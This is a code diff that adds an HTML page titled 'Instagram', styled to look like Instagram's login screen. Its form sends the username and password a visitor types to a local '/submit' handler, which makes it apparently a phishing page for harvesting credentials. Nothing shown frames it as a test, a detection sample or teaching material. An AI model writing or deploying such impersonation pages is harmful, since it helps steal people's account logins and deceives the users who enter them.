@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 4px; }
+        button { background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram</h2>
+        <form action="/submit" method="post">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
